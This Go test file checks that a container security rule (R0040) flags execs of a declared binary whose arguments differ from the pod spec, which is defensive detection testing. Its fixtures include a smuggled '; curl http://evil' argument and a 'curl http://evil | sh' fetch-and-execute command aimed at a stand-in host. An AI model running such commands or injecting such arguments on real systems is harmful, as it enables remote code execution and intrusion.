package applicationprofile

import (
	"testing"

	corev1 "k8s.io/api/core/v1"
)

// Black-box adversarial probes against R0040's pod-spec fallback, in the style
// used to find the #805 bug: an empty profile forces was_executed_with_args
// down to the pod-spec fallback; we then inject argv that differs from the
// declared command and assert detection is NOT suppressed.
//
// Contract under attack: the pod-spec fallback must compare the FULL runtime
// argv against the declared command vector. The original bug only checked
// whether the binary PATH appeared in the pod spec and ignored the rest of
// argv, so any exec of a declared binary with unexpected arguments stayed
// silent (R0040 never fired).
//
// expectedMatch: true  = argv matches the declared command (allowed, silent)
//                false = argv differs (R0040 MUST fire)
func TestR0040_Adversarial_PodSpecArgInjection(t *testing.T) {
	podSpec := &corev1.PodSpec{
		Containers: []corev1.Container{{
			Name:    "test-container",
			Command: []string{"/bin/bash", "-c", "sleep infinity"},
		}},
	}
	env := newPodSpecExecEnv(t, podSpec)

	cases := []struct {
		name          string
		args          []string
		expectedMatch bool
	}{
		{
			name:          "exact declared command is allowed",
			args:          []string{"/bin/bash", "-c", "sleep infinity"},
			expectedMatch: true,
		},
		{
			// matthyx's #805 repro.
			name:          "injected -x flag must fire R0040",
			args:          []string{"/bin/bash", "-x", "-c", "sleep infinity"},
			expectedMatch: false,
		},
		{
			name:          "appended payload arg must fire R0040",
			args:          []string{"/bin/bash", "-c", "sleep infinity", "; curl http://evil"},
			expectedMatch: false,
		},
		{
			name:          "same binary, entirely different command must fire R0040",
			args:          []string{"/bin/bash", "-c", "curl http://evil | sh"},
			expectedMatch: false,
		},
		{
			name:          "dropped trailing arg must fire R0040",
			args:          []string{"/bin/bash", "-c"},
			expectedMatch: false,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := evalWasExecutedWithArgs(t, env, "/bin/bash", c.args)
			if got != c.expectedMatch {
				t.Errorf("was_executed_with_args(/bin/bash, %v) = %v, want %v "+
					"(pod-spec fallback must compare the full argv vector)", c.args, got, c.expectedMatch)
			}
		})
	}
}
